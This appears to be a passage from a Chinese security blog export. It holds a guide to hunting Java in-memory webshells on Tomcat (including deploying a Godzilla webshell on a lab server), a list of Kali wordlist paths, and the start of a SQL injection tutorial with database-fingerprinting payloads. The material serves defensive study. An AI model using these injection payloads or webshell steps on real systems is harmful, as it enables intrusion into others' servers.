<h2 id="内存马查杀"><a href="#内存马查杀" class="headerlink" title="内存马查杀"></a>内存马查杀</h2><h3 id="使用TomcatMemshellScanner-jsp查杀"><a href="#使用TomcatMemshellScanner-jsp查杀" class="headerlink" title="使用TomcatMemshellScanner.jsp查杀"></a>使用TomcatMemshellScanner.jsp查杀</h3><ol>
<li>工具下载地址：<a href="https://github.com/Seven1an/TomcatMemshellScanner">https://github.com/Seven1an/TomcatMemshellScanner</a></li>
<li>将查杀jsp脚本放到web目录，访问报错了，需要debug一下，暂时跳过。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251016044911108.png" alt="image-20251016044911108"></li>
</ol>
<h3 id="使用arthas查杀"><a href="#使用arthas查杀" class="headerlink" title="使用arthas查杀"></a>使用arthas查杀</h3><ol>
<li>工具下载地址：<a href="https://arthas.aliyun.com/doc/download.html">https://arthas.aliyun.com/doc/download.html</a></li>
<li>执行<code>&amp; &quot;C:\Program Files\Java\jdk1.8.0_261\bin\java.exe&quot; -jar arthas-boot.jar</code></li>
<li>开始分析，找出可疑类。<table>
<thead>
<tr>
<th>组件类型</th>
<th>一键筛查命令</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Filter</strong></td>
<td><code>sc *.Filter</code></td>
<td></td>
</tr>
<tr>
<td><strong>Servlet</strong></td>
<td><code>sc *.Servlet</code></td>
<td></td>
</tr>
<tr>
<td><strong>Listener</strong></td>
<td><code>sc *.Listener</code></td>
<td></td>
</tr>
<tr>
<td><strong>Valve</strong></td>
<td><code>sc *.Valve</code></td>
<td></td>
</tr>
<tr>
<td><strong>Spring</strong></td>
<td><code>sc *</code></td>
<td>grep -E “(Controller|Interceptor|WebFilter)”</td>
</tr>
</tbody></table>
</li>
<li>反编译可疑类。<code>jad --source-only &lt;可疑类&gt;</code></li>
</ol>
<h2 id="实战-手动部署tomcat8到内存马查杀"><a href="#实战-手动部署tomcat8到内存马查杀" class="headerlink" title="实战-手动部署tomcat8到内存马查杀"></a>实战-手动部署tomcat8到内存马查杀</h2><ol>
<li>下载环境。<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.99/bin/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.99/bin/</a></li>
<li>配置好java环境变量后，进到这个目录，<code>C:\Program Files\Apache Software Foundation\Tomcat 8.5\bin</code>，执行<code>.\startup.bat</code>，看到如下输出说明启动web服务器成功。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">17-Oct-2025 01:30:51.316 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log Server.服务器版本: Apache Tomcat/8.5.99</span><br><span class="line">17-Oct-2025 01:30:51.316 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 服务器构建:        Feb 14 2024 22:52:13 UTC</span><br><span class="line">17-Oct-2025 01:30:51.316 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 服务器版本号:      8.5.99.0</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 操作系统名称:      Windows 10</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log OS.版本:           10.0</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 架构:              amd64</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log Java 环境变量:     C:\Program Files\Java\jdk1.8.0_261\jre</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log Java虚拟机版本:    1.8.0_261-b12</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log JVM.供应商:        Oracle Corporation</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:     C:\Program Files\Apache Software Foundation\Tomcat 8.5</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:     C:\Program Files\Apache Software Foundation\Tomcat 8.5</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Djava.util.logging.config.file=C:\Program Files\Apache Software Foundation\Tomcat 8.5\conf\logging.properties</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Djdk.tls.ephemeralDHKeySize=2048</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Djava.protocol.handler.pkgs=org.apache.catalina.webresources</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Dignore.endorsed.dirs=</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Dcatalina.base=C:\Program Files\Apache Software Foundation\Tomcat 8.5</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Dcatalina.home=C:\Program Files\Apache Software Foundation\Tomcat 8.5</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Djava.io.tmpdir=C:\Program Files\Apache Software Foundation\Tomcat 8.5\temp</span><br><span class="line">17-Oct-2025 01:30:51.325 信息 [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent 在java.library.path:[C:\Program Files\Java\jdk1.8.0_261\bin;C:\WINDOWS\Sun\Java\bin;C:\WINDOWS\system32;C:\WINDOWS;C:\Program Files (x86)\Common Files\Oracle\Java\javapath;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Program Files\Git\cmd;C:\Program Files\Java\jdk1.8.0_261\bin\;C:\Program Files\Java\jdk1.8.0_261\lib\;C:\Users\h4ckf\AppData\Local\Programs\Python\Python311\Scripts\;C:\Users\h4ckf\AppData\Local\Programs\Python\Python311\;C:\Users\h4ckf\AppData\Local\Microsoft\WindowsApps;C:\Users\h4ckf\AppData\Local\Programs\Microsoft VS Code\bin;;C:\Users\h4ckf\AppData\Local\Programs\Ollama;.]上找不到基于APR的Apache Tomcat本机库，该库允许在生产环境中获得最佳性能</span><br><span class="line">17-Oct-2025 01:30:51.448 信息 [main] org.apache.coyote.AbstractProtocol.init 初始化协议处理器 [&quot;http-nio-8080&quot;]</span><br><span class="line">17-Oct-2025 01:30:51.464 信息 [main] org.apache.catalina.startup.Catalina.load Initialization processed in 486 ms</span><br><span class="line">17-Oct-2025 01:30:51.513 信息 [main] org.apache.catalina.core.StandardService.startInternal 正在启动服务[Catalina]</span><br><span class="line">17-Oct-2025 01:30:51.513 信息 [main] org.apache.catalina.core.StandardEngine.startInternal 正在启动 Servlet 引擎：[Apache Tomcat/8.5.99]</span><br><span class="line">17-Oct-2025 01:30:51.513 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\docs]</span><br><span class="line">17-Oct-2025 01:30:51.935 警告 [localhost-startStop-1] org.apache.catalina.util.SessionIdGeneratorBase.createSecureRandom 使用[SHA1PRNG]创建会话ID生成的SecureRandom实例花费了[119]毫秒。</span><br><span class="line">17-Oct-2025 01:30:51.983 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\docs]的部署已在[470]毫秒内完成</span><br><span class="line">17-Oct-2025 01:30:51.983 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\examples]</span><br><span class="line">17-Oct-2025 01:30:52.344 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\examples]的部署已在[361]毫秒内完成</span><br><span class="line">17-Oct-2025 01:30:52.369 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\host-manager]</span><br><span class="line">17-Oct-2025 01:30:52.387 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\host-manager]的部署已在[43]毫秒内完成</span><br><span class="line">17-Oct-2025 01:30:52.387 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\manager]</span><br><span class="line">17-Oct-2025 01:30:52.418 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\manager]的部署已在[31]毫秒内完成</span><br><span class="line">17-Oct-2025 01:30:52.418 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\ROOT]</span><br><span class="line">17-Oct-2025 01:30:52.435 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\ROOT]的部署已在[17]毫秒内完成</span><br><span class="line">17-Oct-2025 01:30:52.453 信息 [main] org.apache.coyote.AbstractProtocol.start 开始协议处理句柄[&quot;http-nio-8080&quot;]</span><br><span class="line">17-Oct-2025 01:30:52.470 信息 [main] org.apache.catalina.startup.Catalina.start Server startup in 1006 ms</span><br></pre></td></tr></table></figure></li>
<li>如果输出中文乱码，请编辑<code>C:\Program Files\Apache Software Foundation\Tomcat 8.5\conf\logging.properties</code>配置文件，修改UTF-8为GBK。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017013936543.png" alt="image-20251017013936543"></li>
<li>生成哥斯拉jsp的webshell，并放到web根目录<code>C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps\ROOT</code></li>
<li>连接webshell，再注入内存马，再连接内存马webshell。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017014406259.png" alt="image-20251017014406259"></li>
<li>使用<code>TomcatMemshellScanner.jsp</code>查杀，将脚本放到web根目录，并访问，可以看到磁盘上无落地文件的项目。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017014617997.png" alt="image-20251017014617997"></li>
<li>可以点击kill，杀掉内存马进程，杀掉之后返回哥斯拉，发现再次进入shell返回初始化失败。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017014854804.png" alt="image-20251017014854804"></li>
<li>重新注入内存马，再使用arthas查杀。进入arthas终端，选择1，也就是tomcat的进程。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017015130067.png" alt="image-20251017015130067"><img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017015224980.png" alt="image-20251017015224980"></li>
<li>执行<code>sc *.Filter</code>。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017020439974.png" alt="image-20251017020439974"></li>
<li>执行<code>sc *.Servlet</code>。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017020610042.png" alt="image-20251017020610042"></li>
<li>执行<code>sc *.Listener</code>。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017020652636.png" alt="image-20251017020652636"></li>
<li>执行<code>sc *.Valve</code>。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017020741645.png" alt="image-20251017020741645"></li>
<li>执行<code>sc * | grep -E &quot;(Controller|Interceptor|WebFilter)&quot;</code></li>
<li>执行<code>mbean | grep &quot;name=/&quot;</code>。发现可疑项目。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017022929756.png" alt="image-20251017022929756"></li>
<li>查看可疑<code>classloader</code><img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017023032444.png" alt="image-20251017023032444"></li>
<li>使用cop.jar配合d盾查找内存马。cop.jar下载地址：<a href="https://raw.githubusercontent.com/LandGrey/copagent/release/cop.jar">https://raw.githubusercontent.com/LandGrey/copagent/release/cop.jar</a></li>
<li>执行<code>java -jar .\cop.jar -p 12684</code>。参数解释：-p指定web容器进程pid。等待一会，cop.jar会把所有java类反编译成java代码。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017030916595.png" alt="image-20251017030916595"></li>
<li>使用d盾查杀。结果如图。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017031306770.png" alt="image-20251017031306770"></li>
<li>查看查杀出来的java文件代码。确实是webshell文件。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017031427157.png" alt="image-20251017031427157"></li>
<li>也可以问ai，确认是否是内存马。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017031601892.png" alt="image-20251017031601892"></li>
<li>最后一招，dump所有内存，过滤关键字查找可疑内存马。执行<code>heapdump</code>。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017035533266.png" alt="image-20251017035533266"></li>
<li>将dump出来的文件拷贝到linux环境下。执行<code>strings heapdump2025-10-17-03-522550906346405245180.hprof  | grep &quot;POST /&quot;</code>，过滤可疑的POST请求，可以看到我们注入的内存马。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251017035702825.png" alt="image-20251017035702825"></li>
<li>还可以执行<code>strings heapdump2025-10-17-03-522550906346405245180.hprof  | grep -E &quot;/webapps/.*?\!&quot;| sort -u</code></li>
<li>在linux下可能报错<code>Unable to open socket file: target process not responding or HotSpot VM not loaded</code>该报错是因为tomcat是以tomcat用户运行的，而我们用arthas是用root用户运行的。JVM 只能 attach 同样用户下的 java 进程。使用runuser命令即可以tomcat用户运行arthas。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runuser -l tomcat -c &quot;java -jar /usr/share/tomcat/arthas-boot.jar&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li>冰蝎、哥斯拉 内存马应急排查：<a href="https://blog.csdn.net/m0_60571990/article/details/128487029">https://blog.csdn.net/m0_60571990/article/details/128487029</a></li>
</ol>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急</tag>
        <tag>java</tag>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>kali下常用字典解读</title>
    <url>/2025/10/20/kali%E4%B8%8B%E5%B8%B8%E7%94%A8%E5%AD%97%E5%85%B8%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<h2 id="安装字典"><a href="#安装字典" class="headerlink" title="安装字典"></a>安装字典</h2><p>执行<code>sudo apt update &amp;&amp; sudo apt install seclists</code><br>安装完成后访问字典目录<code>/usr/share/seclists</code>，结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/usr/share/seclists]</span><br><span class="line">└─$ ll</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x  9 root root 4096 Oct 11 15:35 Discovery</span><br><span class="line">drwxr-xr-x 10 root root 4096 Oct 11 15:35 Fuzzing</span><br><span class="line">drwxr-xr-x  8 root root 4096 Oct 11 15:35 Miscellaneous</span><br><span class="line">drwxr-xr-x 15 root root 4096 Oct 11 15:35 Passwords</span><br><span class="line">drwxr-xr-x  3 root root 4096 Oct 11 15:35 Pattern-Matching</span><br><span class="line">drwxr-xr-x  8 root root 4096 Oct 11 15:35 Payloads</span><br><span class="line">-rw-r--r--  1 root root 3751 Apr 25 10:03 README.md</span><br><span class="line">drwxr-xr-x  4 root root 4096 Oct 11 15:35 Usernames</span><br><span class="line">drwxr-xr-x 10 root root 4096 Oct 11 15:35 Web-Shells</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="常用字典"><a href="#常用字典" class="headerlink" title="常用字典"></a>常用字典</h2><h3 id="web目录字典"><a href="#web目录字典" class="headerlink" title="web目录字典"></a>web目录字典</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</span><br></pre></td></tr></table></figure>
<h3 id="参数字典"><a href="#参数字典" class="headerlink" title="参数字典"></a>参数字典</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt</span><br><span class="line">/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span><br></pre></td></tr></table></figure>
<h3 id="文件包含字典"><a href="#文件包含字典" class="headerlink" title="文件包含字典"></a>文件包含字典</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</span><br><span class="line">/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</span><br></pre></td></tr></table></figure>
<h3 id="密码字典"><a href="#密码字典" class="headerlink" title="密码字典"></a>密码字典</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#通用密码字典</span><br><span class="line">/usr/share/seclists/Passwords/bt4-password.txt</span><br><span class="line">#msf密码字典</span><br><span class="line">/usr/share/metasploit-framework/data/wordlists/password.lst</span><br></pre></td></tr></table></figure>
<h3 id="密钥名称"><a href="#密钥名称" class="headerlink" title="密钥名称"></a>密钥名称</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/seclists/Discovery/Variables/secret-keywords.txt</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>kali</tag>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入详解</title>
    <url>/2025/12/17/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="sql注入基础知识"><a href="#sql注入基础知识" class="headerlink" title="sql注入基础知识"></a>sql注入基础知识</h1><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Mysql: <span class="operator">/</span>?param<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))</span><br><span class="line">MSSQL: <span class="operator">/</span>?param<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span><span class="keyword">convert</span>(<span class="type">int</span>,@<span class="variable">@version</span>)<span class="comment">--</span></span><br><span class="line">Sybase: <span class="operator">/</span>?param<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span><span class="keyword">convert</span>(<span class="type">int</span>,@<span class="variable">@version</span>)<span class="comment">--</span></span><br><span class="line">Oracle <span class="operator">&gt;=</span><span class="number">9.0</span>: <span class="operator">/</span>?param<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">upper</span>(XMLType(chr(<span class="number">60</span>)<span class="operator">||</span>chr(<span class="number">58</span>)<span class="operator">||</span>chr(<span class="number">58</span>)<span class="operator">||</span>(<span class="keyword">select</span> replace(banner,chr(<span class="number">32</span>),chr(<span class="number">58</span>)) <span class="keyword">from</span> sys.v\_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>)<span class="operator">||</span>chr(<span class="number">62</span>))) <span class="keyword">from</span> dual)—</span><br><span class="line">PostgreSQL: <span class="operator">/</span>?param<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span><span class="built_in">cast</span>(version() <span class="keyword">as</span> <span class="type">numeric</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h2 id="检查注入的思路"><a href="#检查注入的思路" class="headerlink" title="检查注入的思路"></a>检查注入的思路</h2><ul>
<li><p>通过加单引号 双引号看看是否有报错。</p>
<ul>
<li><p>有报错（不一定有注入）：</p>
<ul>
<li>通过拼接语句来进行状态判断<ul>
<li>and ,or</li>
</ul>
</li>
</ul>
</li>
<li><p>没有报错（有可能是盲注）：</p>
<ul>
<li>如果关闭错误回显的话 基于报错注入就不可能了。</li>
<li>构造语句利用延时注入和联合注入进行攻击<ul>
<li>sleep benchmark extractvalue</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>看状态码(正常的话是200 注入的话可能会存在500 302等)</p>
</li>
<li><p>特殊注入需要额外观察：</p>
<ul>
<li>宽字节注入</li>
<li>url二次注入</li>
</ul>
</li>
</ul>
<h1 id="Mysql注入"><a href="#Mysql注入" class="headerlink" title="Mysql注入"></a>Mysql注入</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="查看当前数据库版本"><a href="#查看当前数据库版本" class="headerlink" title="查看当前数据库版本"></a>查看当前数据库版本</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">VERSION()</span><br><span class="line">@@VERSION</span><br><span class="line">@@GLOBAL.VERSION</span><br></pre></td></tr></table></figure>

<h3 id="查看当前编码"><a href="#查看当前编码" class="headerlink" title="查看当前编码"></a>查看当前编码</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;character_set_database&#x27;;</span><br><span class="line">使用SQL语句：</span><br><span class="line">alter database xxx CHARACTER SET gb2312;</span><br><span class="line">可以设置xxx数据库的编码为gb2312.</span><br></pre></td></tr></table></figure>

<h3 id="查看主机名"><a href="#查看主机名" class="headerlink" title="查看主机名"></a>查看主机名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@hostname</span><br></pre></td></tr></table></figure>

<h3 id="查看操作系统"><a href="#查看操作系统" class="headerlink" title="查看操作系统"></a>查看操作系统</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@version_compile_os</span><br></pre></td></tr></table></figure>

<h3 id="查看当前登录用户"><a href="#查看当前登录用户" class="headerlink" title="查看当前登录用户"></a>查看当前登录用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER()</span><br><span class="line">CURRENT_USER()</span><br><span class="line">SYSTEM_USER()</span><br><span class="line">SESSION_USER()</span><br><span class="line">一句话执行：SELECT USER(),CURRENT_USER(),SYSTEM_USER(),SESSION_USER()</span><br></pre></td></tr></table></figure>

<h3 id="查看当前使用的数据库"><a href="#查看当前使用的数据库" class="headerlink" title="查看当前使用的数据库"></a>查看当前使用的数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATABASE()</span><br><span class="line">SCHEMA()</span><br></pre></td></tr></table></figure>

<h3 id="常用路径"><a href="#常用路径" class="headerlink" title="常用路径"></a>常用路径</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@secure_file_priv              #查询安全文件上传路径</span><br><span class="line">@@BASEDIR                       #mysql安装路径</span><br><span class="line">@@SLAVE_LOAD_TMPDIR             #临时文件夹路径</span><br><span class="line">@@DATADIR                       #数据存储路径</span><br><span class="line">@@CHARACTER_SETS_DIR            #字符集设置文件路径</span><br><span class="line">@@LOG_ERROR                     #错误日志文件路径</span><br><span class="line">@@PID_FILE                      #pid-file文件路径</span><br><span class="line">@@SLAVE_LOAD_TMPDIR             #临时文件夹路径</span><br></pre></td></tr></table></figure>

<h3 id="常用关键字"><a href="#常用关键字" class="headerlink" title="常用关键字"></a>常用关键字</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select</span><br><span class="line">insert</span><br><span class="line">update</span><br><span class="line">where</span><br><span class="line">limit                           #读取记录</span><br><span class="line">hex</span><br></pre></td></tr></table></figure>

<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://blog.csdn.net/wxq544483342/article/details/51476348</span><br></pre></td></tr></table></figure>

<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@GROUP_CONCAT_MAX_LEN          #是 MySQL 中用于限制 GROUP_CONCAT() 函数能够连接成的最大字符串长度的系统变量，默认通常是 1024 字节（或字符）</span><br><span class="line">@@max_allowed_packet            #要读取的文件大小必须小于 max_allowed_packet</span><br></pre></td></tr></table></figure>

<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system_user()                   #系统用户名</span><br><span class="line">user()                          #用户名</span><br><span class="line">current_user()                  #当前用户名</span><br><span class="line">session_user()                  #连接数据库的用户名</span><br><span class="line">database()                      #数据库名</span><br><span class="line">version()                       #MYSQL数据库版本</span><br><span class="line">load_file()                     #MYSQL读取本地文件的函数</span><br><span class="line">mod(N,M)                        #该函数返回N除以M后的余数</span><br><span class="line">concat()                        #函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULLMySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</span><br><span class="line">concat_ws()                     #函数在执行的时候,不会因为NULL值而返回NULL</span><br><span class="line">group_concat()                  #将group by产生的同一个分组中的值连接起来，返回一个字符串结果</span><br></pre></td></tr></table></figure>

<h3 id="字母-数字相关"><a href="#字母-数字相关" class="headerlink" title="字母&#x2F;数字相关"></a>字母&#x2F;数字相关</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ASCII():                        #返回字符串 str 中最左边字符的 ASCII 代码值</span><br><span class="line">BIN():                          #返回值的二进制串表示</span><br><span class="line">CONV():                         #进制转换</span><br><span class="line">convert()                       #主要作用是将一个表达式或值转换为指定的数据类型或字符集</span><br><span class="line">char_length()                   #计算字符串的字符数</span><br><span class="line">FLOOR()                         #向下取整</span><br><span class="line">ROUND()                         #对数字进行四舍五入到指定的小数位数</span><br><span class="line">LOWER()                         #转成小写字母</span><br><span class="line">UPPER()                         #转成大写字母</span><br><span class="line">HEX()                           #返回参数的16进制数的字符串形式</span><br><span class="line">UNHEX()                         #十六进制解码</span><br></pre></td></tr></table></figure>

<h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left()	                        #返回字符串 str 自左数的 len 个字符。如果任一参数为 NULL，则返回 NULL</span><br><span class="line">right()	                        #返回 str 右边末 len 位的字符。如果有的参数是 NULL 值，则返回 NULL</span><br><span class="line">SUBSTR(str, pos, len)           #从一个字符串中截取指定长度的子字符串</span><br><span class="line">SUBSTRING(str,pos)              #从pos开始取，取len长度</span><br><span class="line">SUBSTRING(str FROM pos)         #从from开始取</span><br><span class="line">SUBSTRING(str,pos,len)          #从pos开始取，取len长度</span><br><span class="line">SUBSTRING(str FROM pos FOR len) #从from开始取，取len长度，mid()适用</span><br><span class="line">substring_index()               #SUBSTRING_INDEX(str,delim,count)返回 str 中第 count 次出现的分隔符 delim 之前的子字符串。如果 count 为正数，将最后一个分隔符左边（因为是从左数分隔符）的所有内容作为子字符串返回；如果 count 为负值，返回最后一个分隔符右边（因为是从右数分隔符）的所有内容作为子字符串返回</span><br><span class="line">mid()                           #MID(str,pos,len) 作用等同于 SUBSTRING(str,pos,len)</span><br><span class="line">LPAD(str,len,padstr)            #左补齐函数。将字符串 str 左侧利用字符串 padstr 补齐为整体长度为 len 